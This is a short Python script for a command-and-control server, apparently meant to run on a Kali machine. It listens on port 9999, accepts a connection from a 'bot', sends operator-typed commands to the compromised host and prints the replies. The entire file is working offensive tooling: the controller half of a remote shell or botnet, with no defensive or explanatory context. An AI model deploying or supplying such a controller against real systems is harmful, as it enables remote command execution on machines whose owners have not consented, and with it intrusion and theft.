import socket

# Server IP and Port
IP = '192.168.10.110'  # Replace with your C2 Kali machine's static IP
PORT = 9999

# Setup socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((IP, PORT))
server.listen(5)

print("[+] C2 Server Listening...")

client_socket, client_address = server.accept()
print(f"[+] Connection from {client_address}")

while True:
    command = input("Enter command to send to bot: ")

    if command.lower() in ['exit', 'quit']:
        client_socket.send(b'exit')
        client_socket.close()
        break

    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    print(f"[Bot]: {response}")
